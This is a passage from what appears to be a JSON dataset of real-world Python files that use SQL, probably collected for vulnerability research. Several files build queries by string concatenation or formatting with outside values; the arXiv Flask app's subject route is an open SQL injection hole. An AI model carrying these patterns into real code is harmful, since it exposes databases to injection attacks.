InvalidUsage('Only standard achievements can be unlocked directly', status_code=400)\n\n        cursor.execute(\"\"\"SELECT\n                            state\n                        FROM player_achievements\n                        WHERE achievement_id = %s AND player_id = %s\"\"\",\n                       (achievement_id, player_id))\n\n        player_achievement = cursor.fetchone()\n\n        new_state = 'UNLOCKED'\n        newly_unlocked = not player_achievement or player_achievement['state'] != 'UNLOCKED'\n\n        cursor.execute(\"\"\"INSERT INTO player_achievements (player_id, achievement_id, state)\n                        VALUES\n                            (%(player_id)s, %(achievement_id)s, %(state)s)\n                        ON DUPLICATE KEY UPDATE\n                            state = VALUES(state)\"\"\",\n                       {\n                           'player_id': player_id,\n                           'achievement_id': achievement_id,\n                           'state': new_state,\n                       })\n\n    return dict(newly_unlocked=newly_unlocked)\n\n\ndef reveal_achievement(achievement_id, player_id):\n    \"\"\"Reveals an achievement.\n\n    :param achievement_id: ID of the achievement to unlock\n    :param player_id: ID of the player to reveal the achievement for\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"current_state\": string,\n            }\n    \"\"\"\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(\"\"\"SELECT\n                            state\n                        FROM player_achievements\n                        WHERE achievement_id = %s AND player_id = %s\"\"\",\n                       (achievement_id, player_id))\n\n        player_achievement = cursor.fetchone()\n\n        new_state = player_achievement['state'] if player_achievement else 'REVEALED'\n\n        cursor.execute(\"\"\"INSERT INTO player_achievements (player_id, achievement_id, state)\n                        VALUES\n                            (%(player_id)s, %(achievement_id)s, %(state)s)\n                        ON DUPLICATE KEY UPDATE\n                            state = VALUES(state)\"\"\",\n                       {\n                           'player_id': player_id,\n                           'achievement_id': achievement_id,\n                           'state': new_state,\n                       })\n\n    return dict(current_state=new_state)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cansik/pg4nosql/blob/dfa7f769b108846e00e8bb2f029cc3e132584162",
        "file_path": "/pg2nosql/PostgresNoSQLClient.py",
        "source": "import psycopg2\nfrom PostgresNoSQLTable import PostgresNoSQLTable\n\n\nclass PostgresNoSQLClient(object):\n    SQL_CREATE_JSON_TABLE = 'CREATE TABLE %s (id SERIAL, data JSON);'\n    SQL_DROP_JSON_TABLE = 'DROP TABLE IF EXISTS %s;'\n    SQL_TABLE_EXISTS = \"SELECT EXISTS(SELECT relname FROM pg_class WHERE relname='%s')\"\n\n    def __init__(self):\n        self.connection = None\n        self.cursor = None\n\n    def connect(self, host, database, user=None, password=None):\n        self.connection = psycopg2.connect(host=host, database=database, user=user, password=password)\n        self.cursor = self.connection.cursor()\n\n    def close(self):\n        return self.connection.close()\n\n    def create_table(self, table_name):\n        self.cursor.execute(self.SQL_CREATE_JSON_TABLE % table_name)\n        self.commit()\n        return PostgresNoSQLTable(table_name, self.connection)\n\n    def drop_table(self, table_name):\n        self.cursor.execute(self.SQL_DROP_JSON_TABLE % table_name)\n        self.commit()\n\n    def get_table(self, table_name):\n        if self.table_exists(table_name):\n            return PostgresNoSQLTable(table_name, self.connection)\n        else:\n            return None\n\n    def commit(self):\n        self.connection.commit()\n\n    def table_exists(self, table_name):\n        exists = False\n        try:\n            self.cursor.execute(self.SQL_TABLE_EXISTS % table_name)\n            exists = self.cursor.fetchone()[0]\n        except psycopg2.Error as e:\n            print e\n        return exists",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cansik/pg4nosql/blob/dfa7f769b108846e00e8bb2f029cc3e132584162",
        "file_path": "/pg2nosql/PostgresNoSQLTable.py",
        "source": "import json\nimport psycopg2\n\n\nclass PostgresNoSQLTable(object):\n\n    SQL_INSERT_JSON = \"INSERT INTO %s(data) VALUES('%s') RETURNING id\"\n    SQL_QUERY_JSON = 'SELECT %s FROM %s WHERE %s'\n    SQL_GET_JSON = 'SELECT * FROM %s WHERE id=%s'\n\n    def __init__(self, name, connection):\n        self.name = name\n        self.connection = connection\n        self.cursor = self.connection.cursor()\n\n    def commit(self):\n        self.connection.commit()\n\n    def put(self, data):\n        self.cursor.execute(self.SQL_INSERT_JSON % (self.name, json.dumps(data)))\n        return self.cursor.fetchone()[0]\n\n    def get(self, id):\n        self.cursor.execute(self.SQL_GET_JSON % (self.name, id))\n        return self.cursor.fetchone()\n\n    def query(self, query='True', columns='*'):\n        self.cursor.execute(self.SQL_QUERY_JSON % (columns, self.name, query))\n        rows = [item for item in self.cursor.fetchall()]\n        return rows\n\n    def drop(self):\n        raise Exception('not implemented yet!')",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/MartinSMilligan/RaspberryPi-WeatherStation/blob/91ba9e81fcd5382d02ea2f4e25238a62f141a4cf",
        "file_path": "/database.py",
        "source": "#!/usr/bin/python\nimport MySQLdb, datetime, httplib, json, os\n\nclass mysql_database:\n    def __init__(self):\n    \tcredentials_file = os.path.join(os.path.dirname(__file__), \"credentials.mysql\")\n    \tf = open(credentials_file, \"r\")\n        credentials = json.load(f)\n        f.close()\n        for key, value in credentials.items(): #remove whitespace\n            credentials[key] = value.strip()\n            \n        self.connection = MySQLdb.connect(credentials[\"HOST\"], credentials[\"USERNAME\"], credentials[\"PASSWORD\"], credentials[\"DATABASE\"])\n        self.cursor = self.connection.cursor()\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n            self.connection.commit()\n        except:\n            self.connection.rollback()\n            raise\n\n    def query(self, query):\n        cursor = self.connection.cursor(MySQLdb.cursors.DictCursor)\n        cursor.execute(query)\n        return cursor.fetchall()\n\n    def __del__(self):\n        self.connection.close()\n\nclass oracle_apex_database:\n    def __init__(self, path, host = \"apex.oracle.com\"):\n        self.host = host\n        self.path = path\n        self.conn = httplib.HTTPSConnection(self.host)\n        self.credentials = None\n        credentials_file = os.path.join(os.path.dirname(__file__), \"credentials.oracle\")\n        \n        if os.path.isfile(credentials_file):\n            f = open(credentials_file, \"r\")\n            self.credentials = json.load(f)\n            f.close()\n            for key, value in self.credentials.items(): #remove whitespace\n                self.credentials[key] = value.strip()\n        else:\n            print \"credentials file not found\"\n\n        self.default_data = { \"Content-type\": \"text/plain\", \"Accept\": \"text/plain\" }\n\n    def upload(self, id, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created):\n        #keys must follow the names expected by the Orcale Apex REST service\n        oracle_data = {\n\t    \"LOCAL_ID\": str(id),\n\t    \"AMB_TEMP\": str(ambient_temperature),\n\t    \"GND_TEMP\": str(ground_temperature),\n\t    \"AIR_QUALITY\": str(air_quality),\n\t    \"AIR_PRESSURE\": str(air_pressure),\n\t    \"HUMIDITY\": str(humidity),\n\t    \"WIND_DIRECTION\": str(wind_direction),\n\t    \"WIND_SPEED\": str(wind_speed),\n\t    \"WIND_GUST_SPEED\": str(wind_gust_speed),\n\t    \"RAINFALL\": str(rainfall),\n\t    \"READING_TIMESTAMP\": str(created) }\n\n        for key in oracle_data.keys():\n            if oracle_data[key] == str(None):\n                del oracle_data[key]\n\n        return self.https_post(oracle_data)\n\n    def https_post(self, data, attempts = 3):\n        attempt = 0\n        headers = dict(self.default_data.items() + self.credentials.items() + data.items())\n        success = False\n        response_data = None\n\n        while not success and attempt < attempts:\n            try:\n                self.conn.request(\"POST\", self.path, None, headers)\n                response = self.conn.getresponse()\n                response_data = response.read()\n                print response.status, response.reason, response_data\n                success = response.status == 200 or response.status == 201\n            except Exception as e:\n                print \"Unexpected error\", e\n            finally:\n                attempt += 1\n\n        return response_data if success else None\n\n    def __del__(self):\n        self.conn.close()\n\nclass weather_database:\n    def __init__(self):\n        self.db = mysql_database()\n        self.insert_template = \"INSERT INTO WEATHER_MEASUREMENT (AMBIENT_TEMPERATURE, GROUND_TEMPERATURE, AIR_QUALITY, AIR_PRESSURE, HUMIDITY, WIND_DIRECTION, WIND_SPEED, WIND_GUST_SPEED, RAINFALL, CREATED) VALUES({0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, '{9}');\"\n        self.update_template =  \"UPDATE WEATHER_MEASUREMENT SET REMOTE_ID={0} WHERE ID={1};\"\n        self.upload_select_template = \"SELECT * FROM WEATHER_MEASUREMENT WHERE REMOTE_ID IS NULL;\"\n\n    def is_number(self, s):\n        try:\n            float(s)\n            return True\n        except ValueError:\n            return False\n\n    def is_none(self, val):\n        return val if val != None else \"NULL\"\n\n    def insert(self, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")):\n        insert_query = self.insert_template.format(\n            self.is_none(ambient_temperature), \n            self.is_none(ground_temperature), \n            self.is_none(air_quality), \n            self.is_none(air_pressure), \n            self.is_none(humidity), \n            self.is_none(wind_direction), \n            self.is_none(wind_speed), \n            self.is_none(wind_gust_speed), \n            self.is_none(rainfall), \n            created)\n\n        print insert_query\n\n        self.db.execute(insert_query)\n\n    def upload(self):\n        results = self.db.query(self.upload_select_template)\n\n        rows_count = len(results)\n        if rows_count > 0:\n            print rows_count, \"rows to send...\"\n            odb = oracle_apex_database(path = \"/pls/apex/raspberrypi/weatherstation/submitmeasurement\")\n\n            if odb.credentials == None:\n                return #cannot upload\n\n            for row in results:\n                response_data = odb.upload(\n                    row[\"ID\"], \n                    row[\"AMBIENT_TEMPERATURE\"], \n                    row[\"GROUND_TEMPERATURE\"],\n                    row[\"AIR_QUALITY\"], \n                    row[\"AIR_PRESSURE\"], \n                    row[\"HUMIDITY\"], \n                    row[\"WIND_DIRECTION\"], \n                    row[\"WIND_SPEED\"], \n                    row[\"WIND_GUST_SPEED\"], \n                    row[\"RAINFALL\"], \n                    row[\"CREATED\"].strftime(\"%Y-%m-%dT%H:%M:%S\"))\n\n                if response_data != None and response_data != \"-1\":\n                    json_dict = json.loads(response_data)\n                    oracle_id = json_dict[\"ORCL_RECORD_ID\"]\n                    if self.is_number(oracle_id):\n                        local_id = str(row[\"ID\"])\n                        update_query = self.update_template.format(oracle_id, local_id)\n                        self.db.execute(update_query)\n                        print \"ID:\", local_id, \"updated with REMOTE_ID =\", oracle_id\n                else:\n                    print \"Bad response from Oracle\"\n        else:\n            print \"Nothing to upload\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RaspberryPiFoundation/weather-station/blob/91ba9e81fcd5382d02ea2f4e25238a62f141a4cf",
        "file_path": "/database.py",
        "source": "#!/usr/bin/python\nimport MySQLdb, datetime, httplib, json, os\n\nclass mysql_database:\n    def __init__(self):\n    \tcredentials_file = os.path.join(os.path.dirname(__file__), \"credentials.mysql\")\n    \tf = open(credentials_file, \"r\")\n        credentials = json.load(f)\n        f.close()\n        for key, value in credentials.items(): #remove whitespace\n            credentials[key] = value.strip()\n            \n        self.connection = MySQLdb.connect(credentials[\"HOST\"], credentials[\"USERNAME\"], credentials[\"PASSWORD\"], credentials[\"DATABASE\"])\n        self.cursor = self.connection.cursor()\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n            self.connection.commit()\n        except:\n            self.connection.rollback()\n            raise\n\n    def query(self, query):\n        cursor = self.connection.cursor(MySQLdb.cursors.DictCursor)\n        cursor.execute(query)\n        return cursor.fetchall()\n\n    def __del__(self):\n        self.connection.close()\n\nclass oracle_apex_database:\n    def __init__(self, path, host = \"apex.oracle.com\"):\n        self.host = host\n        self.path = path\n        self.conn = httplib.HTTPSConnection(self.host)\n        self.credentials = None\n        credentials_file = os.path.join(os.path.dirname(__file__), \"credentials.oracle\")\n        \n        if os.path.isfile(credentials_file):\n            f = open(credentials_file, \"r\")\n            self.credentials = json.load(f)\n            f.close()\n            for key, value in self.credentials.items(): #remove whitespace\n                self.credentials[key] = value.strip()\n        else:\n            print \"credentials file not found\"\n\n        self.default_data = { \"Content-type\": \"text/plain\", \"Accept\": \"text/plain\" }\n\n    def upload(self, id, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created):\n        #keys must follow the names expected by the Orcale Apex REST service\n        oracle_data = {\n\t    \"LOCAL_ID\": str(id),\n\t    \"AMB_TEMP\": str(ambient_temperature),\n\t    \"GND_TEMP\": str(ground_temperature),\n\t    \"AIR_QUALITY\": str(air_quality),\n\t    \"AIR_PRESSURE\": str(air_pressure),\n\t    \"HUMIDITY\": str(humidity),\n\t    \"WIND_DIRECTION\": str(wind_direction),\n\t    \"WIND_SPEED\": str(wind_speed),\n\t    \"WIND_GUST_SPEED\": str(wind_gust_speed),\n\t    \"RAINFALL\": str(rainfall),\n\t    \"READING_TIMESTAMP\": str(created) }\n\n        for key in oracle_data.keys():\n            if oracle_data[key] == str(None):\n                del oracle_data[key]\n\n        return self.https_post(oracle_data)\n\n    def https_post(self, data, attempts = 3):\n        attempt = 0\n        headers = dict(self.default_data.items() + self.credentials.items() + data.items())\n        success = False\n        response_data = None\n\n        while not success and attempt < attempts:\n            try:\n                self.conn.request(\"POST\", self.path, None, headers)\n                response = self.conn.getresponse()\n                response_data = response.read()\n                print response.status, response.reason, response_data\n                success = response.status == 200 or response.status == 201\n            except Exception as e:\n                print \"Unexpected error\", e\n            finally:\n                attempt += 1\n\n        return response_data if success else None\n\n    def __del__(self):\n        self.conn.close()\n\nclass weather_database:\n    def __init__(self):\n        self.db = mysql_database()\n        self.insert_template = \"INSERT INTO WEATHER_MEASUREMENT (AMBIENT_TEMPERATURE, GROUND_TEMPERATURE, AIR_QUALITY, AIR_PRESSURE, HUMIDITY, WIND_DIRECTION, WIND_SPEED, WIND_GUST_SPEED, RAINFALL, CREATED) VALUES({0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, '{9}');\"\n        self.update_template =  \"UPDATE WEATHER_MEASUREMENT SET REMOTE_ID={0} WHERE ID={1};\"\n        self.upload_select_template = \"SELECT * FROM WEATHER_MEASUREMENT WHERE REMOTE_ID IS NULL;\"\n\n    def is_number(self, s):\n        try:\n            float(s)\n            return True\n        except ValueError:\n            return False\n\n    def is_none(self, val):\n        return val if val != None else \"NULL\"\n\n    def insert(self, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")):\n        insert_query = self.insert_template.format(\n            self.is_none(ambient_temperature), \n            self.is_none(ground_temperature), \n            self.is_none(air_quality), \n            self.is_none(air_pressure), \n            self.is_none(humidity), \n            self.is_none(wind_direction), \n            self.is_none(wind_speed), \n            self.is_none(wind_gust_speed), \n            self.is_none(rainfall), \n            created)\n\n        print insert_query\n\n        self.db.execute(insert_query)\n\n    def upload(self):\n        results = self.db.query(self.upload_select_template)\n\n        rows_count = len(results)\n        if rows_count > 0:\n            print rows_count, \"rows to send...\"\n            odb = oracle_apex_database(path = \"/pls/apex/raspberrypi/weatherstation/submitmeasurement\")\n\n            if odb.credentials == None:\n                return #cannot upload\n\n            for row in results:\n                response_data = odb.upload(\n                    row[\"ID\"], \n                    row[\"AMBIENT_TEMPERATURE\"], \n                    row[\"GROUND_TEMPERATURE\"],\n                    row[\"AIR_QUALITY\"], \n                    row[\"AIR_PRESSURE\"], \n                    row[\"HUMIDITY\"], \n                    row[\"WIND_DIRECTION\"], \n                    row[\"WIND_SPEED\"], \n                    row[\"WIND_GUST_SPEED\"], \n                    row[\"RAINFALL\"], \n                    row[\"CREATED\"].strftime(\"%Y-%m-%dT%H:%M:%S\"))\n\n                if response_data != None and response_data != \"-1\":\n                    json_dict = json.loads(response_data)\n                    oracle_id = json_dict[\"ORCL_RECORD_ID\"]\n                    if self.is_number(oracle_id):\n                        local_id = str(row[\"ID\"])\n                        update_query = self.update_template.format(oracle_id, local_id)\n                        self.db.execute(update_query)\n                        print \"ID:\", local_id, \"updated with REMOTE_ID =\", oracle_id\n                else:\n                    print \"Bad response from Oracle\"\n        else:\n            print \"Nothing to upload\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/HydAu/PiWeatherStation/blob/91ba9e81fcd5382d02ea2f4e25238a62f141a4cf",
        "file_path": "/database.py",
        "source": "#!/usr/bin/python\nimport MySQLdb, datetime, httplib, json, os\n\nclass mysql_database:\n    def __init__(self):\n    \tcredentials_file = os.path.join(os.path.dirname(__file__), \"credentials.mysql\")\n    \tf = open(credentials_file, \"r\")\n        credentials = json.load(f)\n        f.close()\n        for key, value in credentials.items(): #remove whitespace\n            credentials[key] = value.strip()\n            \n        self.connection = MySQLdb.connect(credentials[\"HOST\"], credentials[\"USERNAME\"], credentials[\"PASSWORD\"], credentials[\"DATABASE\"])\n        self.cursor = self.connection.cursor()\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n            self.connection.commit()\n        except:\n            self.connection.rollback()\n            raise\n\n    def query(self, query):\n        cursor = self.connection.cursor(MySQLdb.cursors.DictCursor)\n        cursor.execute(query)\n        return cursor.fetchall()\n\n    def __del__(self):\n        self.connection.close()\n\nclass oracle_apex_database:\n    def __init__(self, path, host = \"apex.oracle.com\"):\n        self.host = host\n        self.path = path\n        self.conn = httplib.HTTPSConnection(self.host)\n        self.credentials = None\n        credentials_file = os.path.join(os.path.dirname(__file__), \"credentials.oracle\")\n        \n        if os.path.isfile(credentials_file):\n            f = open(credentials_file, \"r\")\n            self.credentials = json.load(f)\n            f.close()\n            for key, value in self.credentials.items(): #remove whitespace\n                self.credentials[key] = value.strip()\n        else:\n            print \"credentials file not found\"\n\n        self.default_data = { \"Content-type\": \"text/plain\", \"Accept\": \"text/plain\" }\n\n    def upload(self, id, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created):\n        #keys must follow the names expected by the Orcale Apex REST service\n        oracle_data = {\n\t    \"LOCAL_ID\": str(id),\n\t    \"AMB_TEMP\": str(ambient_temperature),\n\t    \"GND_TEMP\": str(ground_temperature),\n\t    \"AIR_QUALITY\": str(air_quality),\n\t    \"AIR_PRESSURE\": str(air_pressure),\n\t    \"HUMIDITY\": str(humidity),\n\t    \"WIND_DIRECTION\": str(wind_direction),\n\t    \"WIND_SPEED\": str(wind_speed),\n\t    \"WIND_GUST_SPEED\": str(wind_gust_speed),\n\t    \"RAINFALL\": str(rainfall),\n\t    \"READING_TIMESTAMP\": str(created) }\n\n        for key in oracle_data.keys():\n            if oracle_data[key] == str(None):\n                del oracle_data[key]\n\n        return self.https_post(oracle_data)\n\n    def https_post(self, data, attempts = 3):\n        attempt = 0\n        headers = dict(self.default_data.items() + self.credentials.items() + data.items())\n        success = False\n        response_data = None\n\n        while not success and attempt < attempts:\n            try:\n                self.conn.request(\"POST\", self.path, None, headers)\n                response = self.conn.getresponse()\n                response_data = response.read()\n                print response.status, response.reason, response_data\n                success = response.status == 200 or response.status == 201\n            except Exception as e:\n                print \"Unexpected error\", e\n            finally:\n                attempt += 1\n\n        return response_data if success else None\n\n    def __del__(self):\n        self.conn.close()\n\nclass weather_database:\n    def __init__(self):\n        self.db = mysql_database()\n        self.insert_template = \"INSERT INTO WEATHER_MEASUREMENT (AMBIENT_TEMPERATURE, GROUND_TEMPERATURE, AIR_QUALITY, AIR_PRESSURE, HUMIDITY, WIND_DIRECTION, WIND_SPEED, WIND_GUST_SPEED, RAINFALL, CREATED) VALUES({0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, '{9}');\"\n        self.update_template =  \"UPDATE WEATHER_MEASUREMENT SET REMOTE_ID={0} WHERE ID={1};\"\n        self.upload_select_template = \"SELECT * FROM WEATHER_MEASUREMENT WHERE REMOTE_ID IS NULL;\"\n\n    def is_number(self, s):\n        try:\n            float(s)\n            return True\n        except ValueError:\n            return False\n\n    def is_none(self, val):\n        return val if val != None else \"NULL\"\n\n    def insert(self, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")):\n        insert_query = self.insert_template.format(\n            self.is_none(ambient_temperature), \n            self.is_none(ground_temperature), \n            self.is_none(air_quality), \n            self.is_none(air_pressure), \n            self.is_none(humidity), \n            self.is_none(wind_direction), \n            self.is_none(wind_speed), \n            self.is_none(wind_gust_speed), \n            self.is_none(rainfall), \n            created)\n\n        print insert_query\n\n        self.db.execute(insert_query)\n\n    def upload(self):\n        results = self.db.query(self.upload_select_template)\n\n        rows_count = len(results)\n        if rows_count > 0:\n            print rows_count, \"rows to send...\"\n            odb = oracle_apex_database(path = \"/pls/apex/raspberrypi/weatherstation/submitmeasurement\")\n\n            if odb.credentials == None:\n                return #cannot upload\n\n            for row in results:\n                response_data = odb.upload(\n                    row[\"ID\"], \n                    row[\"AMBIENT_TEMPERATURE\"], \n                    row[\"GROUND_TEMPERATURE\"],\n                    row[\"AIR_QUALITY\"], \n                    row[\"AIR_PRESSURE\"], \n                    row[\"HUMIDITY\"], \n                    row[\"WIND_DIRECTION\"], \n                    row[\"WIND_SPEED\"], \n                    row[\"WIND_GUST_SPEED\"], \n                    row[\"RAINFALL\"], \n                    row[\"CREATED\"].strftime(\"%Y-%m-%dT%H:%M:%S\"))\n\n                if response_data != None and response_data != \"-1\":\n                    json_dict = json.loads(response_data)\n                    oracle_id = json_dict[\"ORCL_RECORD_ID\"]\n                    if self.is_number(oracle_id):\n                        local_id = str(row[\"ID\"])\n                        update_query = self.update_template.format(oracle_id, local_id)\n                        self.db.execute(update_query)\n                        print \"ID:\", local_id, \"updated with REMOTE_ID =\", oracle_id\n                else:\n                    print \"Bad response from Oracle\"\n        else:\n            print \"Nothing to upload\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/sepehr125/arxiv-doc2vec-recommender/blob/2e1c1c16053d34f64122bbb2550cbe2386d0ce75",
        "file_path": "/app.py",
        "source": "# -*- coding: utf-8 -*-\nfrom operator import itemgetter\nimport psycopg2\nfrom psycopg2.extras import DictCursor\nfrom flask import Flask\nfrom flask import render_template\nfrom flask import request\nfrom gensim.models import Doc2Vec\nimport re\nimport argparse\n\napplication = Flask(__name__)\n\n\n\"\"\"Helpers\"\"\"\ndef get_subjects():\n    cur = conn.cursor()\n    query = \"SELECT subject, count(*) FROM articles group by subject;\"\n    cur.execute(query)\n    subjects = sorted(cur.fetchall(), key=lambda tup:tup[0])\n    return subjects\n\ndef get_articles(indices):\n    with conn.cursor(cursor_factory=DictCursor) as cur:\n        query = cur.mogrify(\"SELECT * FROM articles WHERE index IN %s ORDER BY last_submitted DESC\", (tuple(indices),))\n        cur.execute(query)\n        articles = cur.fetchall()\n        return articles\n\ndef get_articles_by_subject(subject):\n    with conn.cursor(cursor_factory=DictCursor) as cur:\n        query = \"SELECT * FROM articles WHERE subject='\" + subject + \"' ORDER BY last_submitted DESC\"\n        cur.execute(query)\n        articles = cur.fetchall()\n        return articles\n\ndef get_article(index):\n    with conn.cursor(cursor_factory=DictCursor) as cur:\n        query = \"SELECT * FROM articles WHERE index=\"+str(index)\n        cur.execute(query)\n        article = cur.fetchone()\n        return article\n\n@application.route('/viz')\ndef viz():\n    return render_template(\"louvain.html\")\n\n@application.route('/')\n@application.route('/subjects/')\n@application.route('/subjects/<subject>')\ndef browse_subjects(subject=None):\n    if subject is None:\n        return render_template(\"browse.html\", subjects=get_subjects())\n    else:\n        articles = get_articles_by_subject(subject)\n        return render_template(\"articles.html\", articles=articles, subject=subject)\n\n@application.route('/article/<main_article_id>')\ndef find_similars(main_article_id=None):\n    main_article = get_article(main_article_id)\n    sims = model.docvecs.most_similar(int(main_article_id), topn=10) # list of (id, similarity)\n    sim_articles = get_articles([int(index) for index, sim in sims]) # list of dictionaries...\n    # we're gonna add similarity scores to each dictionary (article) in above list from sims\n    sort_these = []\n    for article in sim_articles:\n        sim_score = [score for idx, score in sims if article['index'] == idx ][0]\n        article.extend([round(sim_score, 2)])\n        sort_these.append(article)\n\n    # sort the list of dictionaries by value\n    # sorted_articles = sorted(sort_these, key=itemgetter('similarity'))\n\n    return render_template(\"doc.html\", main_article=main_article, sims=sort_these)\n\n@application.route('/search', methods=['POST'])\ndef search():\n    if request.method == 'POST':\n        query = request.form['search']\n        q_vec = model.infer_vector(query.split())\n        results = model.docvecs.most_similar(positive=[q_vec], topn=100)\n        results = [int(r[0]) for r in results]\n        results = get_articles(results)\n        return render_template(\"search.html\", articles=results)\n\n@application.route('/analogy')\ndef find_analogy():\n    like1 = request.args.get('like1', '')\n    like2 = request.args.get('like2', '')\n    likes = [word.lower() for word in [like1, like2] if word != '']\n    \n    unlike = request.args.get('unlike', '')\n    unlike = [word.lower() for word in list(unlike) if word not in ('', '#')]\n    if not likes and not unlike:\n        return render_template(\"analogy.html\", analogies=[], error=False)\n    try:\n        analogies = model.most_similar(positive=likes, negative=unlike)\n        return render_template(\"analogy.html\", analogies=analogies)\n    except:\n        return render_template(\"analogy.html\", analogies=[], error=True)\n\n\n\nif __name__ == '__main__':\n    \n    parser = argparse.ArgumentParser(description='Fire up flask server with appropriate model')\n    parser.add_argument('model_path', help=\"Name of model file\")\n    args = parser.parse_args()\n\n    # load model:\n    model = Doc2Vec.load(args.model_path)\n\n    # run app in db connection context\n    with psycopg2.connect(dbname='arxiv') as conn:\n        application.run(host='0.0.0.0', debug=True)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/asascience-open/ooi-ui-services/blob/8c9b55a738e56184e0b731ea3bc8fc631240ed79",
        "file_path": "/ooiservices/model/adaptor/postgres.py",
        "source": "#!/usr/bin/env python\n'''\nooiservices.adaptor.postgresadaptor\n\nDefinitions for the PostgresAdaptor\n'''\n\n__author__ = 'Edna Donoughe'\n\nimport psycopg2\nimport psycopg2.extras\n\nclass PostgresAdaptor(object):\n    database = None\n    username = None\n    password = None\n    host     = None\n    port     = None\n\n    def __init__(self, database=None, username=None, password=None, host=None, port=None):\n        object.__init__(self)\n        self.database = database\n        self.username = username\n        self.password = password\n        self.host = host\n        self.port = port\n\n    def get_db(self):\n        try:\n            conn = psycopg2.connect(database=self.database, user=self.username, password=self.password, host=self.host, port=self.port)\n            return conn\n        except psycopg2.DatabaseError, e:\n            raise Exception('<PostgresAdaptor> connect failed (check config): %s: ' % e)\n        except:\n            raise Exception('<PostgresAdaptor> get_db failed to connect; check config settings')\n\n    def perform(self, query, arg_list=None):\n        #Create a cursor_factory to return dictionary\n        conn = self.get_db()\n        try:\n\n            c = conn.cursor(cursor_factory = psycopg2.extras.RealDictCursor)\n            if arg_list:\n                c.execute(query, arg_list)\n            else:\n                c.execute(query)\n\n            result = c.fetchall()\n            conn.commit()\n\n        except psycopg2.DatabaseError, e:\n            raise Exception('<PostgresAdaptor> perform failed: %s: ' % e)\n\n        finally:\n            if conn:\n                conn.close()\n\n        return result",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/asascience-open/ooi-ui-services/blob/8c9b55a738e56184e0b731ea3bc8fc631240ed79",
        "file_path": "/ooiservices/model/adaptor/sqlite.py",
        "source": "#!/usr/bin/env python\n'''\nooiservices.adaptor.sqlite\n\nDefinitions for the SQLiteAdaptor\n'''\n\n__author__ = 'Matt Campbell'\n\nimport sqlite3 as lite\n\nclass SQLiteAdaptor(object):\n    db = None\n\n    def __init__(self,dbName):\n        object.__init__(self)\n        self.db = dbName\n\n    def get_db(self):\n        if self.db:\n            conn = lite.connect(self.db)\n            return conn\n\n    def perform(self, query, obj=None):\n        #Create a factory to return dictionary\n        def dict_factory(cursor, row):\n            d = {}\n            for idx, col in enumerate(cursor.description):\n                d[col[0]] = row[idx]\n            return d\n        conn = self.get_db()\n        conn.row_factory = dict_factory\n        c = conn.cursor()\n\n        try:\n            if lite.complete_statement(query):\n                if obj:\n                    c.execute(query, obj)\n                else:\n                    c.execute(query)\n\n            result = c.fetchall()\n            #possibly condition commit to only insert/update/delete.\n            conn.commit()\n\n        except lite.Error, e:\n            result = '%s' % e.args[0]\n            print query\n\n        finally:\n            if conn:\n                conn.close()\n        return result",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/asascience-open/ooi-ui-services/blob/8c9b55a738e56184e0b731ea3bc8fc631240ed79",
        "file_path": "/ooiservices/model/sqlmodel.py",
        "source": "#!/usr/bin/env python\n\n'''\nooiservices.model.sqlmodel\n\nSQLModel\n'''\n\nfrom ooiservices.exceptions import ModelException\nfrom ooiservices.config import DataSource\nfrom ooiservices.adaptor.postgres import PostgresAdaptor as PSQL\nfrom ooiservices.adaptor.sqlite import SQLiteAdaptor as SQL\nfrom ooiservices.model.base import BaseModel\n\nclass SqlModel(BaseModel):\n\n\n    def __init__(self):\n        '''\n        Instantiates new base model\n        '''\n        from ooiservices import get_db\n        # A really obscure bug that causes a severe headache down the road\n        BaseModel.__init__(self)\n        self.sql = get_db()\n        if (DataSource['DBType'] == 'sqlite'):\n            self.holder = '?'\n        elif (DataSource['DBType'] == 'psql'):\n            self.holder = '%s'\n        else:\n            raise ModelException('Unsupported Database: %s' % DataSource['DBType'])\n\n    #CRUD methods\n    def create(self, obj):\n        '''\n        Inserts a new row into the table based on the obj should be a\n        dictionary like where the keys are the column headers.\n        '''\n\n        if 'id' not in obj:\n            obj['id'] = self._get_latest_id() + 1\n\n        columns = ', '.join(obj.keys())\n        empties = ', '.join([self.holder for col in obj])\n        query = 'INSERT INTO ' + self.table_name + ' (' + columns + ') VALUES (' + empties + ');'\n        feedback = self.sql.perform(query, obj.values())\n\n\n        return obj\n\n\n    def read(self, query_params=None):\n        '''\n        Modified to (temporarily) support interim UI specification for output\n        '''\n        query_params = query_params or {}\n\n        if query_params:\n            where_clause, query_items = self._build_where_clause(query_params)\n            query = 'SELECT * FROM ' + self.table_name + ' WHERE ' + where_clause\n            answer = self.sql.perform(query, 